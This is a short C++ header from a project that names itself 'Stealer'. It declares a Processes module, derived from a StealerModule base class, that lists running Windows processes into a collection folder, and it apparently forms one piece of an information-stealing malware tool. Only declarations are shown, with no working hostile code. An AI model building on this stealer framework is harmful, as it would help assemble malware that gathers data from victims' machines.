//
// Created by .1qxz on 08.06.2024.
//

#ifndef STEALER_PROCESSES_H
#define STEALER_PROCESSES_H


#include "../StealerModule.h"
#include <windows.h>
#include <cstdio>
#include <tchar.h>
#include <psapi.h>

class Processes : public StealerModule {
public:
    void execute(fs::path &root) override;
private:
    static std::string printProcess(DWORD processID);
};


#endif //STEALER_PROCESSES_H
